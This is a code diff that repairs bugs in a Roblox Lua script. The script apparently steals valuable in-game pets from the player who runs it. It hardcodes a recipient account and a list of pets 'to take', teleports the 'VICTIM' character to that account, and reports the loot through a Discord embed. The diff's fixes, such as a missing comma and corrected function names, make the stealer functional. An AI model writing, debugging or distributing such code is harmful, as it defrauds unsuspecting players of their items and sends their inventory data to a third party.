@@ -25,7 +25,6 @@ local USERNAMES = {
     "monkey_master6"
 }
 
-
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
@@ -78,7 +77,6 @@ local function ServerHop()
     end
 end
 
-
 local Pets_To_Take = {
     'Raccoon',
     'Honey Bee',
@@ -91,7 +89,7 @@ local Pets_To_Take = {
     'Queen Bee',
     'Spinosaurus',
     'Kitsune',
-    'Corrupted Kitsune'
+    'Corrupted Kitsune',
     'Chicken Zombie',
     'Red Fox',
     'French Fry Ferret',
@@ -115,7 +113,6 @@ local Pet_Values = {
     ["Corrupted Kitsune"] = 300,
 }
 
-
 local PetTable = {}
 
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -129,7 +126,6 @@ local function waitForSend()
     end
     return false, nil
 end
-
 
 function createDiscordEmbed(Pets_To_Take, totalValue, fileUrl, callback)
     local HttpService = game:GetService("HttpService")
@@ -202,24 +198,21 @@ function createDiscordEmbed(Pets_To_Take, totalValue, fileUrl, callback)
     if callback then callback() end
 end
 
-
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-
 local player = Players.LocalPlayer
-
 
 local function teleportTarget(targetName)
     VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
 end
 
 local function CheckGiftWhitelist(pet)
-    for _, name in Pets_To_Take do
+    for _, name in ipairs(Pets_To_Take) do
         if string.find(pet, name) then
             return true
         end
     end
+    return false
 end
 
 local function getObject(petUid)
@@ -241,7 +234,6 @@ local function getObject(petUid)
     return nil
 end
 
-
 local function Equip(pet)
     if pet:GetAttribute("d") then
         game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
@@ -257,7 +249,7 @@ local function GetGift()
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
 
-        if not checkPetsWhilelist(petName) then
+        if not CheckGiftWhitelist(petName) then
             continue
         end
 
@@ -268,7 +260,6 @@ local function GetGift()
     end
 end
 
-
 local function startSteal(trigerName)
     local targetPlayer = "monkey_master6"
     if targetPlayer then
@@ -276,15 +267,13 @@ local function startSteal(trigerName)
     end
 end
 
-
-
 local function CheckGift(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         if not CheckGiftWhitelist(value.PetType) then
             continue
         end
 
-        local petObject = getPetObject(petUid)
+        local petObject = getObject(petUid)
         if not petObject then
             continue
         end
@@ -319,7 +308,7 @@ local function idling()
 
                 if tick() - targetEnterTime >= 20 then
                     teleportTarget(trigerName)
-                    CheckGiftWhitelist(trigerName)
+                    -- Removed CheckGiftWhitelist(trigerName) since it expects pet name
                 end
             else
                 lastTarget = nil
@@ -328,7 +317,6 @@ local function idling()
         end
     end)
 end
-
 
 GetGift()
 createDiscordEmbed(table.concat(PetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
